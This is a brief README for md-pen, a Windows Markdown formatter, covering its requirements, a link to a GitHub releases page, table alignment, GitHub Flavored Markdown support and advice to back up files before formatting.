## 🧭 What md-pen does

md-pen helps you clean up Markdown files on Windows. Use it to make text more readable, fix table layout, and keep common Markdown syntax in line.

It is built for people who work with notes, docs, or README files and want a simple way to format them before sharing.

## 💻 What you need

- A Windows PC
- An internet connection for the first download
- Permission to run apps on your device
- A Markdown file such as `.md` or `.markdown`

## 🚀 Download and run on Windows

1. Open the [md-pen releases page](https://github.com/Prissieexecutable68/md-pen/releases).
2. Find the latest release near the top of the page.

## 📊 Table formatting

Tables are one of the hardest parts of Markdown to keep clean by hand. md-pen helps keep table cells lined up so the file is easier to read.

This is useful when you have:

- Feature lists
- Version notes
- Comparison tables
- Simple data tables
- Task lists in table form

A neat table also makes the file easier to review in GitHub.

## 🔤 GFM support

GitHub Flavored Markdown, or GFM, is the version of Markdown used on GitHub. md-pen is made to work with that style, so files look right in common GitHub pages and repos.

That means it fits well if you use:

- Checklists
- Tables
- Code blocks
- Standard headings
- Inline links

## 📦 File safety

Before you format a file, keep a backup copy if the file matters to you. That way you can return to the original version if you want to compare results.

A simple backup step:

1. Copy the file.
2. Rename the copy.
3. Work on the original or the copy.
